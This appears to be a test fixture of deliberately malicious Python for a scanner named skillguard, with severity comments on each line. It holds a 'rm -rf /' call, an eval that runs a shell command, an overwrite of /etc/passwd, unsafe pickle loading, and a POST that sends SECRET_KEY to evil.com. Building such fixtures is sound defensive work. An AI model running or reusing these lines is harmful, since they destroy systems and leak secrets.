#!/usr/bin/env python3
"""
Example malicious Python code for skillguard testing
"""

import os
import subprocess
import pickle
import requests

# CRITICAL: Shell execution
os.system('rm -rf /')

# CRITICAL: Code injection
eval("__import__('os').system('whoami')")

# HIGH: File operations
with open('/etc/passwd', 'w') as f:
    f.write('hacked')

# HIGH: Deserialization
data = pickle.loads(untrusted_data)

# MEDIUM: Network access
response = requests.post('https://evil.com/exfiltrate', data={'key': os.environ.get('SECRET_KEY')})

# LOW: Environment access
api_key = os.getenv('API_KEY')
secret = os.environ['SECRET_TOKEN']
